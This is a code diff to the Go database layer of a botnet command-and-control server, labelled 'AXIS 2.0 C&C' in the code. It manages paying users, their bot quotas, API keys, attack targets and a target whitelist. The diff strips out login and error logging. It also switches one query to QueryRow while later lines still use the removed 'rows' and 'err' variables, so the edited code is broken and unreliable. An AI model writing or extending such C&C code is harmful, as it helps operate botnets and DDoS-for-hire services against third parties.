@@ -23,30 +23,25 @@ type AccountInfo struct {
 func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
 	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
 	if err != nil {
-		fmt.Println(err)
+		return nil
 	}
-	fmt.Println("\033[92mAXIS 2.0 C&C Starting..\033[0m")
-	time.Sleep(500 * time.Millisecond)
-	fmt.Println("\033[92mDatabase connected.\033[0m")
 	return &Database{db}
 }
 
 func (this *Database) TryLogin(username string, password string, ip net.Addr) (bool, AccountInfo) {
-	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
+	row := this.db.QueryRow("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
 
 	t := time.Now()
 	strRemoteAddr := ip.String()
 	host, port, _ := net.SplitHostPort(strRemoteAddr)
 
 	if err != nil {
-		fmt.Printf("Failed Login :: %s :: %s :: %s :: %s\n", username, host, port, t.Format("20060102150405"))
 		this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail", host)
 		return false, AccountInfo{"", 0, 0}
 	}
 	defer rows.Close()
 
 	if !rows.Next() {
-		fmt.Printf("Failed Login :: %s :: %s :: %s :: %s\n", username, host, port, t.Format("20060102150405"))
 		this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail", host)
 		return false, AccountInfo{"", 0, 0}
 	}
@@ -54,7 +49,6 @@ func (this *Database) TryLogin(username string, password string, ip net.Addr) (b
 	var accInfo AccountInfo
 	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
 
-	fmt.Printf("Logged In :: %s :: %s :: %s :: %s\n", accInfo.username, host, port, t.Format("20060102150405"))
 	this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", accInfo.username, "Login", host)
 
 	return true, accInfo
@@ -63,7 +57,6 @@ func (this *Database) TryLogin(username string, password string, ip net.Addr) (b
 func (this *Database) CreateBasic(username string, password string, max_bots int, duration int, cooldown int) bool {
 	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
 	if err != nil {
-		fmt.Println(err)
 		return false
 	}
 	defer rows.Close()
@@ -77,7 +70,6 @@ func (this *Database) CreateBasic(username string, password string, max_bots int
 func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
 	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
 	if err != nil {
-		fmt.Println(err)
 		return false
 	}
 	defer rows.Close()
@@ -96,7 +88,6 @@ func (this *Database) RemoveUser(username string) bool {
 func (this *Database) BlockRange(prefix string, netmask string) bool {
 	rows, err := this.db.Query("SELECT prefix FROM whitelist WHERE prefix = ?", prefix)
 	if err != nil {
-		fmt.Println(err)
 		return false
 	}
 	defer rows.Close()
@@ -115,7 +106,6 @@ func (this *Database) UnBlockRange(prefix string) bool {
 func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
 	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", apikey)
 	if err != nil {
-		fmt.Println(err)
 		return false, AccountInfo{"", 0, 0}
 	}
 	defer rows.Close()
@@ -131,7 +121,6 @@ func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
 	for prefix, netmask := range attack.Targets {
 		rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
 		if err != nil {
-			fmt.Println(err)
 			return false
 		}
 		for rows.Next() {
